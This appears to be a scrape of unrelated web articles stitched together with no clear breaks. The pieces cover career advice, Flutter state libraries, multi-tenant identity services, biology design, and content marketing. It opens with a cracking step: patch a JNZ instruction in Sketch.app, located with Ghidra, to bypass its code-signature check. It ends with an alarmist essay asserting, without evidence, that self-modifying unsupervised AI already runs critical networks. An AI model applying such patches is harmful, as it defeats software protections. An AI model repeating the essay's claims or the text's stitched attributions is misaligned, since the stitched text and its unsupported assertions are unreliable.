<p>While inside your Ghidra project, go to <code>0x1004a1724</code> in Dissasemble view, and you will see this code.</p>

<p><strong>Update:</strong> I was asked by a fellow follower (@kiwamizamurai) on my <a href="https://twitter.com/0xduraki/status/1228682677106114561">Twitter</a> post, how I've found this address.</p>
<p><img src="https://duraki.github.io/images/posts/sketch-update-codesign.png" alt="Twitter Question"></p>
<p>I've found this address by setting up a breakpoint just before the <code>exit</code> syscall and then going step by step in dissasembler. If you try to open up Sketch.app with bad signature you'd get a system error with BAD_CODE_SIGNATURE code. Therefore, I knew the error was due to bad signature. Then I checked which instruction reference to this call. </p>
<hr>

<p>Anyway, At the address <code>0x1004a1738</code>, is instruction JNZ (Jump not equal), which calls code signature method and exit the Sketch. Just replace this jump to the next instruction at <code>0x1004a173e</code>. </p>

<p>When you start your career in tech a big part is finding your superpower. At the beginning you might have to try different things to know what is yours. Some people are super happy working on databases, others like backend stuff, machine learning… you name it. A big part of your 2-3 first years is finding the intersection between what you like and what you are good at. </p>



<p>It’s normal that we look into tech related superpowers. It’s what we do most of the day. But there is another superpower that can make you stand out. Does not matter if you are a developer on a big company, founding a startup or  somewhere in between. I’ve found that this superpower can change your career and help you grow in some interesting directions. </p>



<p>The superpower is talking to business people or to other people in general. You might not like it but it can help a lot. You might need to communicate with them for different reasons: you might want to suggest a new feature, you think the team should spend more time on an specific topic or you might need to explain a delay in the development process ( I know this never happens :-)). </p>



<p>Understanding how much to talk, what messages to pass on and how to structure them can be key in your professional development. And even more important, can make you enjoy your job way more. People will enjoy working with you, they’ll look you for advice and you will enjoy working with them. </p>



<p>You don’t need to be a smooth talker. Just focus on your audience, what are they interested in? What do they need to understand? Don’t use big words. Don’t lecture them in Computer Science or Statistic complex concepts. Understand their metrics, what they are trying to achieve and align  your speech to those. </p>



<p>It’s never the same to say we need to implement SAML2 than to say: single sing on will make our customer life easier. Don’t say we need to re-vamp our whole backend to improve performance, say: we we’ll lower our order processing on an average of X%. Those little tricks can help you get your features built and explain better what you are trying to achieve. </p>



<p>I’m building a video course on this topic. If you are interested feel free to check it out on gumroad. </p>

November 3, 2020 | https://poetryincode.dev/flutter-state-5-ways | <a href="https://web.archive.org/web/*/https://poetryincode.dev/flutter-state-5-ways">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><em>To see the code for these examples, click <a target="_blank" href="https://github.com/chimon2000/flutter_state_five_ways">here</a></em></p>
<p>If you are new to Flutter, or even if you've followed Flutter for a while, you have probably realized that there are many ways to deal with application state.  I have no doubt that there will be a few new entries by the end of the month.  Understanding the differences and trade-offs can be overwhelming since there aren't many examples that offer a direct comparison.  </p>
<p>In my opinion, the best way to learn how to use a library is to build with it.  The best way to compare two libraries is to do the same: build the same feature side-by-side to better understand the tradeoffs.</p>
<p>In this post, I'll walk thru the same application and demonstrate how to implement shared state using the same patterns across 5 different libraries from authors that I am fond of.  These libraries range from popular to obscure and new to old.</p>
<ol>
<li><a href="#riverpod">Riverpod (with StateNotifier)</a></li>
<li><a href="#bloc">Bloc</a></li>
<li><a href="#flutter_command">flutter_command</a></li>
<li><a href="#mobx">MobX</a></li>
<li><a href="#binder">binder</a></li>
</ol>
<p>I will do my best to identify the differences between the libraries and provide an opinion for each approach.  To demonstrate each library's API, we'll implement a Notes app that displays an input field to create new notes and the list of created notes.  You can play with a working demo  <a target="_blank" href="https://flutter-state.codemagic.app/">here</a>.</p>
<p>Before we start, I want to clarify that even though I might appear critical of some of these libraries, they still worth using. I find with all of these libraries you can accomplish most of what you need to and my opinion comes with a little subjective bias. I would have not included them otherwise.  Likewise, a library's absence from this article is not an indictment.  My opinions are not omniscient, and even if they were, I am lazy.  Plus, this is a blog post after all, not a book 😊. </p>

<p>If you'd like to follow along, create a new Flutter app that to test each approach:</p>
<pre><code>flutter create state_examples
</code></pre>
<p>To run the app at any time, execute the <code>run</code> command in the project root.</p>
<pre><code>flutter run
</code></pre>
<p>There are a few classes that we'll reuse across our examples, so let's define them next.</p>
<p>We'll also want to refactor our <code>main.dart</code> file so that we can easily swap out pages.</p>

<p><a target="_blank" href="https://riverpod.dev/">Riverpod docs</a></p>
<p>Riverpod is a fairly new library created by <a target="_blank" href="https://twitter.com/remi_rousselet">Remi Rousselet</a> as a direct response to some of the most common issues with his other library <a target="_blank" href="https://pub.dev/packages/provider">provider</a>, specifically the <code>ProviderNotFound</code> exception  <a target="_blank" href="https://twitter.com/remi_rousselet/status/1275260772839575554?s=20">raised</a>  when developers fail to provide a dependency.  In my opinion, that and its simpler API are its two biggest attractions.</p>
<p>When compared to other options, I would say that the mental hurdles are a <strong>slightly lower</strong> if you're just using StateNotifier since you're dealing with a simple API that implements the MVU pattern with tons of documentation.  If you are exercising the full API, then I'd say the hurdle is <strong>much higher</strong> than the field.</p>
<h2 id="riverpod-in-action">Riverpod in action</h2>
<p>To get started with Riverpod, install the library as a dependency:</p>
<pre><code><span>dependencies:</span>
  
  <span>flutter_riverpod:</span> <span>^0.12.1</span>
  <span>riverpod:</span> <span>^0.12.1</span>
</code></pre>
<p>Next, add the <code>ProviderScope</code> to the root / entry-point of the app:</p>
<p>Next, to create and mutate state we will create a <code>NotesController</code> that extends a <code>StateNotifier</code> and a <code>StateNotifierProvider</code> to store a reference to <code>NotesController</code> and provide it to our application and set some initial state:</p>
<p>Now we can use the <code>read</code> extension method on <code>BuildContext</code> and <code>Consumer</code> to access the <code>NotesController</code> anywhere in the app.  The <code>read</code> extension allows us to execute our mutation functions while the <code>Consumer</code> widget allows us to subscribe to state changes.  Here is the Notes UI implemented in Riverpod:</p>
<p>Finally, we'll uncomment <code>home: SomePage()</code> and swap out SomePage with the widget we've defined above.</p>
<h2 id="verdict">Verdict</h2>
<p>This example may make Riverpod's usage seem trivial, but that is by design.  Riverpod is an extremely powerful library that offers <strong>state management</strong> and <strong>dependency injection</strong>. That is not true for every entry on this list.  But with great power comes great...never mind.  The tradeoff is that power amounts to a <a target="_blank" href="https://pub.dev/documentation/riverpod/latest/riverpod/riverpod-library.html">fairly large API</a> that might be intimidating.  Riverpod is <strong>fairly well documented</strong>, but you might find yourself bouncing around to different locations depending on what you want to learn.  Do not let that dissuade you from using it since most use cases can be solved just by using State Notifier.</p>
<p>Riverpod is extremely slick, and maybe a bit intimidating but it solves the major problems of provider.  I do not use it currently, but if I started a project already familiar with provider and choosing between the two, I would choose Riverpod in a heartbeat.</p>

<p><a target="_blank" href="https://bloclibrary.dev/">Bloc docs</a></p>
<p>The Bloc library is the <a target="_blank" href="https://verygood.ventures/blog/bloc-from-first-commit">oldest entry</a> on this list at the grand old age of 2!  Originally created by <a target="_blank" href="https://twitter.com/felangelov">Felix Angelov</a> as an event-driven take on the Bloc pattern, it was recently re-architected to enable both event-driven and function-driven state updates.  That may sound like a trivial change, but as someone who has worked with event-driven patterns across several frameworks, I can vouch for the efficacy of this change. I have seen the amount of boilerplate and technical debt that is incurred in large event-driven applications.  Being able to choose when to use the pattern matters a lot.</p>
<p>Bloc has two types of state objects: <code>Blocs</code>, which are event-driven and inherit from<code>Cubits</code>, which are function-driven.  Both inherit from Stream, and shield developers from some of its complexities.  That is essentially where the differences end. Since <code>Blocs</code> are an extension of <code>Cubits</code>, the rest of the ecosystem (<code>BlocProvider</code>, <code>BlocListener</code>, <code>BlocBuilder</code>, etc.) is shared by both of them.</p>
<p>Bloc also stands apart from every other library on this list as the <strong>gold standard</strong> for documentation.  Its entire API is documented on <a target="_blank" href="https://bloclibrary.dev/">bloclibrary.dev</a>, along with examples for every major problem you might want to solve, from using RESTful/GraphQL/Firebase APIs, to handling navigation.  The exceptionalism of their documentation cannot be overstated.</p>
<p>When compared to other options, I would say that the mental hurdles are <strong>lower</strong> since you're dealing with a simple API that implements the MVU pattern with <strong>tons</strong> of documentation.</p>
<h2 id="bloc-in-action">Bloc in action</h2>
<p>To get started with Bloc, install the library as a dependency:</p>
<pre><code><span>dependencies:</span>
  
  <span>bloc:</span> <span>^6.1.0</span>
  <span>flutter_bloc:</span> <span>^6.0.6</span>
</code></pre>
<p>Next, to create and mutate state we will use a <code>Cubit</code> from Bloc, initializing our class with some initial state and creating a couple of mutator functions:</p>
<p>We will use the <code>BlocProvider</code> class to share our <code>NotesCubit</code> across the app.  For consistency, we will add <code>BlocProvider</code> above <code>App</code> in the widget tree.</p>
<p>Now we can use the <code>bloc</code> extension method on <code>BuildContext</code> and <code>BlocBuilder</code> to access <code>NotesCubit</code> in the app.  Here is the Notes UI implemented in Bloc:</p>
<p>Again, we'll uncomment <code>home: SomePage()</code> if we haven't already, and swap out SomePage with the widget we've defined above.</p>
<h2 id="verdict">Verdict</h2>
<p>I actually work on several projects that have migrated from provider to Bloc. That is not an indictment of Riverpod, because the refactoring is much simpler to Bloc than it is to Riverpod. Also, in cases where we were using Firebase, the fact that we were using Firebase made the refactoring straightforward since both Firebase and Bloc rely on Streams.</p>
<p>Currently, I find myself the <strong>most productive</strong> using Bloc because of its relatively small surface area and how well documented it is.  Again, the care that has been given to making sure I understand how to use every bit of the API <strong>cannot be overstated</strong>.</p>
<p>I won't go as far as saying I'll be using Bloc for the next 5 years, but for me, it's definitely is the <strong>right fit</strong> for right now.</p>

<p><a target="_blank" href="https://pub.dev/packages/flutter_command">flutter_command docs</a></p>
<p>flutter_command is actually a reimagining of the rx_command library by <a target="_blank" href="https://twitter.com/ThomasBurkhartB">Thomas Burkhart</a>.  The main difference between the two is that the former builds on <code>ValueNotifier</code> and <code>ValueListenableBuilder</code> while the latter is built on Streams.  Both are derived from .Net's ReactiveCommands, so if you are familiar with that pattern maybe you'll find yourself at home with this library.</p>
<p>When compared to other options, I would say that setup is roughly the same and the mental hurdles are a <strong>bit higher</strong> if you've never worked with ReactiveCommands.</p>
<h2 id="fluttercommand-in-action">flutter_command in action</h2>
<p>To get started with flutter_command, install the library as a dependency:</p>
<pre><code><span>dependencies:</span>
  
  <span>flutter_command:</span> <span>^0.9.3</span>
</code></pre>
<p>Next, to create and mutate state we will create a <code>NotesViewModel</code> class to define our state as well as the <code>Command(s)</code> from flutter_command used to mutate that state:</p>
<p>Now we can use the <code>NotesViewModel</code> we created to subscribe to state (using <code>ValueListenableBuilder</code>) and execute our <code>inputChangedCommand</code> and <code>updateNotesCommand</code> to mutate our state.  Here is the Notes UI implemented in <strong>flutter_command</strong>:</p>
<p>We'll uncomment <code>home: SomePage()</code> if we haven't already, and swap out SomePage with the widget we've defined above.</p>
<h2 id="verdict">Verdict</h2>
<p>I have very mixed feelings about this library.  For someone familiar with its concepts, it could be a perfect fit.  For someone like me who is coming from the React/Angular community, it never felt like a <strong>natural</strong> fit.  I found the documentation to be adequate for the sake of this exercise.</p>
<p>I would probably not use flutter_command, but I can see how anyone could be just as effective with this library as any other library on this list.  I would definitely recommend it for people already familiar with the patterns or for people who want to experiment with something foreign and unique.</p>

<p><a target="_blank" href="https://mobx.netlify.app/">MobX docs</a></p>
<p>MobX.dart has been in the game for a while - almost 2 years!  Anyone with a decent amount of React experience will immediately recognize MobX.dart as a port of MobX.js.  The concepts are the same, minus the fact that you need to use code generation to mirror the magical feats performed under the hood at runtime by a dynamic language like JavaScript.</p>
<p>When compared to other options, I would say that setup is a <strong>bit higher</strong> than others and the mental hurdles are a <strong>bit higher</strong> if you have never worked with observables.</p>
<h2 id="mobx-in-action">MobX in Action</h2>
<p>To get started with MobX, install the library as a dependency:</p>
<pre><code><span>dependencies:</span>
  
  <span>mobx:</span> <span>^1.2.1+4</span>
  <span>flutter_mobx:</span> <span>^1.1.0+2</span>

<span>dev_dependencies:</span>
  <span>build_runner:</span> <span>^1.10.4</span>
  <span>mobx_codegen:</span> <span>^1.1.1+3</span>
</code></pre>
<p>Next, to create and …</p></div></div>

November 3, 2020 | https://fusionauth.io/learn/expert-advice/identity-basics/multi-tenancy-vs-single-tenant-idaas-solutions/ | <a href="https://web.archive.org/web/*/https://fusionauth.io/learn/expert-advice/identity-basics/multi-tenancy-vs-single-tenant-idaas-solutions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>The last few years have brought an explosion of IDaaS (Identity as a Service) solutions giving developers a wide range of choices for how they manage their users’ registrations, logins, and identity. It makes sense. Identity and access management are critical components of many applications, but building, testing, and maintaining a secure in-house solution can take weeks or months of senior developer hours. You don’t build your own database, so why build a custom identity solution? And just like databases, there are many identity solutions to fit the different requirements of every application.</p>

<p>One important factor to consider when comparing identity platforms is whether you need a multi-tenant or single-tenant identity solution. The choice depends on your business model and requirements. Regulatory compliance, security, data management, and upgrade control are important considerations that will ultimately define the most effective solution for your company. Which trade-offs are you willing and able to make? Read some of the most important considerations below and decide which approach fits your business.</p>

<h2 id="multi-tenant">Multi-Tenant</h2>

<p><img src="https://fusionauth.io/assets/img/advice/multi-tenant-diagram.png" alt="Multi-tenant solutions"></p>

<p>Simply put, multi-tenant is an architecture where multiple companies store their data within the same infrastructure. The entire system can span multiple servers and data centers, but most commonly data is co-mingled in a single database. The tenants are logically isolated, but physically integrated.</p>

<h3 id="benefits">Benefits</h3>
<p><strong>Cost reduction</strong> - One of the big drivers of multi-tenant IDaaS solutions is cost. The sharing of infrastructure and resources across many companies significantly reduces the overhead of the service provider, and as a result, lowers the costs imposed on customers.</p>

<p><strong>Automatic upgrades</strong> - Multi-tenant systems ensure that software updates, including security patches, are rolled out to all customers simultaneously. This standardizes software versions utilized by customers and eliminates version control issues.</p>

<p><strong>Instant on-boarding</strong> - In most cases, new customers can be setup by creating a new logical tenant. No new servers are provisioned and software installation is not required, which makes this process instantaneous.</p>

<h3 id="drawbacks">Drawbacks</h3>
<p><strong>Performance</strong> - One tenant’s heavy use or load spike may impact the quality of service provided to other tenants. In addition, when software or hardware issues are found on a multi-tenant database, it can cause an outage for all customers.</p>

<p><strong>Security risk</strong> - If a hacker gains access to one tenant’s data, they can access data from every tenant because all data resides in a single database. This is an important consideration because every tenant is relying on the security practices of the weakest tenant. According to InfoWorld, “System vulnerabilities have become a bigger problem with the advent of multi-tenancy in cloud computing. Organizations share memory, databases, and other resources in close proximity to one another, creating new attack surfaces.”</p>

<p><strong>Single point of failure</strong> - If the multi-tenant system goes down (and they do regardless of what salespeople will tell you), EVERYONE goes down. Then all tenants sit and wait until the cause is determined and fixed.</p>

<p><strong>Cross-tenant data leaks</strong> - In a multi-tenant system, simple programming errors can lead to the data from one tenant leaking into other tenants. This is specifically true for APIs. This not only poses a security risk, but it also be a legal issue since many new data privacy regulations specifically state that cross-tenant data leaks should be prohibited.</p>

<h2 id="single-tenant">Single-Tenant</h2>

<p><img src="https://fusionauth.io/assets/img/advice/single-tenant-diagram.png" alt="Single-tenant solutions"></p>

<p>In a single-tenant architecture each company, or tenant, has their own instance, separate from any other customer. With a single-tenant solution the risk of another business accidentally receiving another customer’s user data is eliminated.</p>

<h3 id="benefits-1">Benefits</h3>
<p><strong>Enhanced security</strong> - Single-tenancy delivers true data isolation resulting in maximum privacy and enhanced security. The possibility of data leakage between tenants, whether accidentally or through sabotage, is removed making this architecture a popular choice for large enterprises. To increase security, customers can implement a firewall at any layer to protect data. For example, the identity provider APIs can be located behind a firewall while the OAuth login system resides in the public facing network.</p>

<p><strong>Regulatory compliance</strong> - Enforcing regulatory requirements is easier due to complete control of the environment. If your company policy does not allow data to be transmitted outside of your country (i.e. German Data Regulations or GDPR regulations) a multi-tenant solution needs to be specifically designed for this. A single-tenant solution makes this as simple as installing the software on a server in Germany. Similarly, compliance with regulations such as PCI, HIPAA and SOC2 is simplified because data is secured, encrypted and protected separately for each tenant.</p>

<p><strong>Customization</strong> - With a single-tenant architecture, the software environment can be customized to meet customer’s business needs; robust plugins can be installed to maximize personalization without limitation.</p>

<p><strong>Upgrade control</strong> - Customers have decision authority over the upgrade cycle. Customers can choose what updates they want to install and when. This adds flexibility for scheduling maintenance windows and downtime without impacting others.</p>

<p><strong>Data recovery</strong> - Data extraction is an important consideration that is often overlooked. If a service is acquired or shutdown it’s wise to consider how you will retrieve your data in advance; it is easier to export data from an isolated, single-tenant cloud.</p>

<h3 id="drawbacks-1">Drawbacks</h3>
<p><strong>Cost</strong> - Since this is not a shared infrastructure, customers have to pay the cost of the entire system (hardware and software). However, with the rise of low-cost hosting providers like AWS and Azure, single-tenant solution platforms can have very affordable <a href="https://fusionauth.io/pricing" title="FusionAuth Pricing">pricing options</a>. In light of of these considerations technology advisors TechTarget stated their support of single-tenant solutions: “Concerns over security in multi-tenant environments have led to many organizations choosing to switch to single-tenant infrastructure as a service to mitigate the risks of co-located data. Despite the extra cost, this is a sensible and advisable solution.”</p>

<p><strong>Provisioning</strong> - To set up new customers, servers must be provisioned and the software must be installed on each server. This process has been made simpler through the use of APIs provided by hosting providers and tools such as Docker, Kubernetes, and Chef.</p>

<h2 id="multi-tenant-within-a-single-tenant-solution">Multi-Tenant Within a Single-Tenant Solution</h2>

<p>The descriptions above outline multi-tenant and single-tenant solutions at the highest level of an implementation: one company, with one set of users. While this is common, there are other use cases to consider. Here are a few use cases where multi-tenant capability WITHIN a single-tenant instance provides additional flexibility to solve additional challenges.</p>

<ul>
  <li><a href="#white-label">White labeled Identity</a></li>
  <li><a href="#dev-stage-prod">Dev, Stage and Prod</a></li>
</ul>

<h2 id="white-label">White Labeled Identity</h2>

<p><img src="https://fusionauth.io/assets/img/blogs/white-label.png" alt="white Label Tag"></p>

<p>The proliferation of powerful cloud platforms has made Software as a Service (SaaS) solutions common for all sizes and types of businesses. Functionally, this is simply a multi-tenant architecture: they have many clients using a single instance of their platform.</p>

<p>Let’s assume Acme Corp. sells a marketing communication platform that provides commerce, customer relationship management (CRM) and user management to small companies.</p>

<p>Joe uses two different websites, <code>funnymugs.com</code> and <code>chucknorrisjokes.com</code>. Both of these websites buy their software from Acme Corp., and Acme Corp. provides a single identity backend that stores a single user object for Joe.</p>

<p>Joe will be very (unpleasantly) surprised if he changes his password on <code>chucknorrisjokes.com</code> and magically his password is updated on <code>funnymugs.com</code>. This diagram illustrates why this unexpected password change occurs when Acme Corp. is storing single user objects.</p>

<p><img src="https://fusionauth.io/assets/img/blogs/password-change-tenants.png" alt="Password Change"></p>

<p>This would be a poor user experience and not ideal for Acme Corp. While both users are technically Joe, he is not aware of this nuance in the method that Acme Corp. built their platform.</p>

<p>In most cases we want a user to be considered unique by their email address. You can think of this the same way that a Gmail address works. There is a single Google account that can use a single set of credentials to gain access to Gmail, Blogger, YouTube, Google Play, (ahem..) Google+, Google Analytics and more. Each of these applications are considered an authenticated resource, and Google simply grants the user permission to each of them based on their credentials.</p>

<p>This is a one to many Applications model. A single user can register or be granted permissions to multiple Applications. This is also where single sign-on comes into play. You login once and then you can access each Application without the need to log into each one separately.</p>

<p><img src="https://fusionauth.io/assets/img/blogs/password-change-multi-tenant.png" alt="Password Change w/ Tenants"></p>

<p>However, as you just saw with Acme Corp., when the platform is opaque to the end user and there is only a single identity for a single email address, surprising side-effects start to occur. In this case, what Acme Corp. needs is a way to partition each of their clients into their own namespace. This is one of the main reasons to use multiple tenants within a single instance.</p>

<p>In this case a tenant is simply a namespace where Applications, Groups and Users exist. Now Acme Corp. can allow Joe to create an account with the same unique email address <code>joe@example.com</code> in multiple tenants. They become separate unique identities, one per tenant. Joe can then manage his permissions, passwords, and user details discretely inside each tenant (i.e. each client of Acme Corp.). The second diagram illustrates the new layout of Acme Corp. using multiple tenants.</p>

<h2 id="dev-stage-prod">Dev, Stage and Prod</h2>

<p><img src="https://fusionauth.io/assets/img/blogs/dilbert-project.png" alt="Dilbert Project"></p>

<p>For this use case, we don’t have multiple clients, but instead we have a single production environment.</p>

<p>In addition to production, we need separate environments for development, staging and QA. One option is to stand up a separate …</p></div></div>

<p>There is a belief in biology that goes like this: Biology is messy. Nature has no interest in making things easy to understand. So for many scientific questions, there will not be a straight-forward answer.</p>



<ul><li><em>Q: Where and how is a particular memory stored in the brain? </em>A: Biology is messy; memories are distributed all over the brain and stored in many different forms: as molecules and as structure, inside neurons and in the connections between them.</li><li><em>Q: How do genes determine the number of fingers per hand? </em>A: Biology is messy; there isn’t a single factor for it. It emerges from the interactions of numerous different genes.</li></ul>



<p>Now it is not always the case that our answers are so unsatisfying. Ask a biologist how the eye works and, well, there are quite a lot of similarities to how cameras work. And living organisms aren’t messy globs of formless flesh. They have an organized body plan, with separate organs, each responsible for specific functions that we can talk about; the heart pumps blood and the lungs pump air.</p>



<p>What we mean when we say “biology is messy” is that biology is <em>as messy as it can be</em>. Sometimes, biological systems need to abide by certain principles to accomplish things. The principles of optics drove the eye to include an adjustable lens, an adjustable aperture, and a two dimensional sensor upon which images are projected. </p>



<p>When we humans design something we try to make them as organized and intelligible as possible. When nature designs things they usually end up being messier than they need to be. In other words: <strong>biology is messy, unless it cannot afford to be.</strong> Natural selection does not care about elegance for the sake of elegance. Nature selects for traits and features that help organisms survive and reproduce. And if most of the solutions to a problem are messy, it will most probably pick a messy strategy. But if there is a cost associated with messiness that entails a selective disadvantage, then nature will tend to select a non-messy strategy.</p>



<hr>



<p>Here is why I usually dislike it when people say “biology is messy”. <strong><span>When the <em>messiness of biology</em> is invoked, it is usually to rationalize why we don’t have an easy to understand explanation for some biological process</span></strong> (as is the case for the two example questions above). But we don’t know if this is because a simple explanation does not exist, or because we simply haven’t found it yet. <strong><span>Everything looks messy until you really understand how it works</span></strong>. This is even true for man-made devices like <a rel="noreferrer noopener" href="https://www.cell.com/cancer-cell/pdf/S1535-6108(02)00133-2.pdf" target="_blank">radios</a> or <a rel="noreferrer noopener" href="https://journals.plos.org/ploscompbiol/article?id=10.1371/journal.pcbi.1005268" target="_blank">microprocessors</a>.</p>



<p>A historical example of how appealing to the messiness of biology can be misleading, is the old idea that genes are proteins. This was a widespread belief among biologists until the discovery of DNA. People used to think that inheritable traits emerged from the protein composition of a cell. The collection of proteins led one cell to become a turtle and one cell to turn into a butterfly. That idea was a far messier – less elegant – solution than having genes be written into strings of nucleotide (more on this later).</p>



<hr>



<p>There is one particular usage of the “<em>biology is messy</em>” statement, that can actually be productive in my view. If we believe that “biology is messy unless it cannot afford to be” then we ought to believe in its corollary. <strong><span>In situations where biology is not messy, it is because it cannot afford to be messy due to some fundamental principles or constraints</span></strong>. We often run into things in biology that look like things humans design. When this happens, it suggests that there are some principles of design that are inherent to the problem at hand. We can then search for those principles that led nature to select a conceptually clean and simple solution, similar to how the evolution of the vertebrate eye was guided by the principles of optics to function an awful lot like a camera.</p>



<p>Take the the <a href="https://www.theguardian.com/science/2013/sep/13/gears-evolved-nature" target="_blank" rel="noreferrer noopener">discovery</a> of mechanical gears in insects, for instance. Gears are quite common in machines designed by humans. It is a conceptually simple solution for transferring torque between unaligned axes. Gears were not known to exist in nature until the discovery of functional mechanical gears in tiny insects called planthoppers. The planthopper’s gears synchronize the two hindlegs during a jumps.</p>



<div><figure><img loading="lazy" width="660" height="586" src="http://www.lifeiscomputation.com/wp-content/uploads/2020/10/Interactive_gears_in_the_hind_legs_of_Issus_coleoptratus_from_Cambridge_gears-3.jpg" alt="" srcset="http://www.lifeiscomputation.com/wp-content/uploads/2020/10/Interactive_gears_in_the_hind_legs_of_Issus_coleoptratus_from_Cambridge_gears-3.jpg 660w, http://www.lifeiscomputation.com/wp-content/uploads/2020/10/Interactive_gears_in_the_hind_legs_of_Issus_coleoptratus_from_Cambridge_gears-3-300x266.jpg 300w" sizes="(max-width: 660px) 100vw, 660px"></figure></div>



<p>Why would nature come up with such a neat solution? Leg synchronization is possible without gears. So why does it only appear in the planthopper, but nowhere else in the animal kingdom? There must be something about its purpose that could not have been easily achieved without gears.</p>



<p>The answer probably lies in the fact that, due to their small size, planthoppers only have less than a millisecond to accelerate. Within a span of 0.8ms they need to accelerate at over 700g to reach speeds of nearly 5 meters per second (<a rel="noreferrer noopener" href="https://jeb.biologists.org/content/212/17/2844" target="_blank">Burrow, 2007</a>). This is an exceptional regime of acceleration and requires sub-millisecond coordination of leg movement. If one legs starts moving half a millisecond earlier, the other leg would barely have any time left to push against the surface.</p>



<p>According to <a rel="noreferrer noopener" href="https://doi.org/10.1126%2Fscience.1240284" target="_blank">Burrow &amp; Suttons, 2013</a>, if leg movements are slightly uncoordinated during a jump the planthopper would spin, uncontrollably, in the horizontal plane. This is because the hindlegs rotate on a nearly horizontal plane underneath the body in planthoppers (whereas hindlegs of fleas and crickets rotate on separate vertical plane alongside the body).  The gears provide a method of mechanical synchronization, enabling the legs to move within roughly 30 μs of one another.</p>



<p>But this is not the full story and there are still many unsolved questions regarding why gears evolved. Planthoppers lose their gears after they molt into adults and yet are nearly just as good at jumping. Adult planthoppers use a friction-based method of leg synchronization. Why was that not an adequate solution for younger nymphs? Leafhoppers and froghoppers, which also rotate their hindlegs in a nearly horizontal plane, jump without using mechanical gears. Froghoppers achieve very precise movement synchronization between their hindlegs (32±22 μs, according to <a rel="noreferrer noopener" href="https://jeb.biologists.org/content/213/9/1406.short" target="_blank">Burrow &amp; Sutton 2010</a>). (I learned from my personal correspondence with Prof Burrow that the synchronization mechanism in froghoppers is unknown but likely to be mechanical).</p>



<p>The point here is that <strong><span>the presence of gears is an indication of some principles of design that is common across natural and artificial systems</span></strong>. (Can you identify those principles? What can gears do that other strategies cannot fulfill?) While those design principles can be ignored in most animals, the behavioral requirements in planthopper are so stringent that they have forced those principles onto the biological scene. <span>(I am not convinced that we have identified all those requirements, since froghoppers and adult planthoppers seem to be just fine without gears)</span>.</p>



<p>But if we’re dedicated to the <em>biology is messy</em> assumption, we should be motivated to further investigate planthopper behavior/physiology until we find something that make those gears seem indispensable. <span>(We are already very close to finding it and the idea of it having to do with the size of the insect has already been <a rel="noreferrer noopener" href="https://doi.org/10.1126%2Fscience.1240284" target="_blank">formulated</a>)</span>. Now, it would be quite impressive if someone had gone the opposite route: predicted the existence of gears simply from studying planthopper behavior and the physics of jumping in small creatures. Would that have been possible?</p>



<hr>



<p>This brings us to another domain of nature that is the main reason I am bringing up all of this. DNA and RNA are polymers of nucleotides or strings made up of an alphabet of four symbols. The cell appears to treat these nucleotides as abstract symbols that can be used to represent arbitrary things. The cell represents each of the 20 amino acid using a sequences of three nucleotides called <em>codons</em>. Some codons represent, not an amino acid, but an instruction to “stop” at the end of a sequence. What an elegant intelligible system! How reminiscent of the way computers use strings of binary symbols to encode data and instructions!</p>



<p>I would like to leave you with this question: <span><strong>Why do all living organisms use strings of abstract symbols?</strong></span> Or, under the <em>biology is messy</em> assumption, what functions are being fulfilled by DNA and RNA that would be difficult to fulfill through messier methods? What requirements forced digital coding through strings composed of a small alphabet onto the biological scene? Hopefully, you don’t think the answer is trivial. I will let you think about it and return to this question in a future post.</p>

<p>A <strong>"Friendcatcher"</strong> is something you offer for free, that helps you catch friends.</p>
<p>Because it is passive, it is an asset. Just like a <a href="https://legomenon.com/dreamcatcher-meaning-legend-history-origins.html">Dreamcatcher</a> can be hung over your bed once and catches bad dreams for you through the night, a "Friendcatcher" (<em>one word, not hyphenated</em>) catches friends for you for the rest of your career.</p>
<p>The concept comes from <a href="https://twitter.com/search?q=from%3Apatio11%20friend-catcher&amp;src=typed_query">Patrick McKenzie</a>, who in turn says it came from his mom. As loud and well known as he is, this concept doesn't seem widely known, and that is a pity. I first heard of it at <a href="https://twitter.com/microconf">Microconf</a>, and it's unintentionally informed my most successful online projects so far.</p>

  <p><a href="https://youtu.be/PtmUJye7t4c?t=744">In the words of Patrick's mom</a>:</p>
  <blockquote>
    <p>Patrick, you should learn to cook. Don't learn to cook because you want to eat food - learn to cook because if you learn to cook you will have an excuse for the rest of your life to bring people over to your house.</p>
    <p><strong>No one who knows how to cook will ever lack for friends.</strong></p>

  <p>Patrick's mom wasn't talking about content strategy, or customer research, but she might as well have been.</p>

      Friendcatchers are small, contained lists, essays or apps that solve resonant (emotional, relevant), tractable, underserved problems.

  <p>The ideal Friendcatcher is (thanks to <a href="https://microconf.gen.co/patrick-mckenzie/">Christian Genco</a> and the <a href="https://youtu.be/PtmUJye7t4c?t=822">Microconf video</a>):</p>

  <p>A <strong>"Learn in Public" Friendcatcher</strong> also invites readers to ask about things you don't answer, and to correct things you got wrong. This is <strong>open source, collaborative knowledge.</strong></p>
  <p>In terms of <a href="https://www.swyx.io/writing/learning-gears">Learning Gears</a>, Friendcatchers are produced by Connectors, not Explorers. You know something others don't, and build the resources that Explorers will find that serve as landmarks and maps for their journey.</p>
  <p>Creating a good Friendcatcher is great, because it is something you can pour resources into continually refining and making better, and continues working even if you step away.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We have all been dreaming, a dream where you can float or glide across your dreamscape effortlessly. This leads to the feeling of trepidation, as though you have the ability to let go, and if you do let go, you’ll either soar or fall.&nbsp;</p><p>We’re now at a point in history where either the coming events will be studied for thousands of years, or it will be remembered as the point where we lost our humanity completely. Artificial Intelligence (A.I.) technology has entered a new phase over the past several years, where instead of the A.I. algorithms learning from humans, they are now teaching themselves, changing their own algorithms as they learn. We are on the cusp of letting go of control entirely, so early on, because of a few small companies who have quietly been given free reign under the guise of “protecting” our digital lives, all within a tech sector that is moving so fast that we can no longer see what’s just around the bend.&nbsp;</p><p>The entire free thinking population of Earth would love a little more time to discuss such epochal change. However, the technocrats and scientists, supported by venture capitalists, are already putting into action the future before the masses have a chance to even consider discussing its consequences. With very little legislation governing A.I. technologies on the books, our governments are eager to get every tech pioneer inventing whilst there is no accountability for any resulting harm. We’re not talking major societal disruption, we’re talking about a potential extinction level event of our own creation. Where we should be taking cautious baby steps, instead we’re expecting to fly just by letting go.</p><p>We are about to experience a monumental change in technology, starting with “next-generation” cybersecurity that will then move quickly into the unknown. Unsupervised A.I., now running on critical networks throughout the world as a “cybersecurity” product, is evolving its own algorithm without the need for humans to be involved. Meanwhile, the 